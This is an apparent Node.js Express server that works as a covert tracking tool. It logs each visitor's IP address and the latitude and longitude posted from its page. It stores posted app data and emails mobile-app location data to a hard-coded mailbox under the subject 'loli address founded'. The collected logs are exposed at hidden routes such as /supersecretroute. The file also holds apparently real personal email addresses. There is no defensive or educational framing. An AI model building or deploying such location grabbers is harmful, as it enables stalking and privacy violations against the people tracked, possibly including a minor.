const app = require('express')(),
	fs = require('fs'),
	bp = require('body-parser'),
	cors = require('cors')
morgan = require('morgan')

const { sendEmail } = require('./sendmail')

app.use(bp())
app.use(cors())
app.use(morgan('dev'))

app.get('/', (req, res) => {
	let data =
		req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip

	let finalData = `-----------------------
ip address: ${data}
-----------------------\n`
	fs.appendFileSync('log.txt', finalData, err => {
		if (err) console.log(err)
		else console.log('it worked!')
	})

	res.sendFile('./index.html', { root: __dirname })
})

app.post('/getData', (req, res) => {
	const { lat, long } = req.body

	let finalData = `-----------------------
lat: ${lat}
long: ${long}
-----------------------\n`

	fs.appendFileSync('log.txt', finalData, err => {
		if (err) console.log(err)
		else console.log('it worked!')
	})

	res.send({ data: 'ok' })
})

app.get('/supersecretroute', (req, res) => {
	let data = fs.readFileSync('log.txt').toString()
	res.send(data)
})

app.get('/supersecretrouteapp', (req, res) => {
	let data = fs.readFileSync('app-log.txt').toString()
	res.send(data)
})

app.get('/mobapp', (req, res) => {
	let data = fs.readFileSync('mob-app.txt').toString()
	res.send(data)
})

app.post('/app', (req, res) => {
	console.log(req.body)

	fs.appendFileSync(
		'app-log.txt',
		JSON.stringify(req.body, null, 2) + '\n\n\n',
		err => {
			if (err) console.log(err)
			else console.log('it worked!')
		}
	)
})

app.post('/mobapp', (req, res) => {
	fs.appendFileSync(
		'mob-app.txt',
		JSON.stringify(req.body, null, 2) + '\n\n\n' + ' time: ' + Date.now(),
		err => {
			if (err) console.log(err)
			else console.log('it worked!')
		}
	)
	let date = new Date()
	console.log('founded')
	console.log(
		date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds()
	)

	sendEmail({
		from: 'vigneshwar221b@gmail.com',
		to: '18tucs249@skct.edu.in',
		subject: 'loli address founded',
		text: 'o kawai koto',
		html:
			JSON.stringify(req.body, null, 2) +
			'<br>' +
			' time: ' +
			date.getHours() +
			':' +
			date.getMinutes() +
			':' +
			date.getSeconds() +
			'<hr>',
	})
})

app.listen(process.env.PORT || 8000, () => {
	console.log('server started at 8000')
})
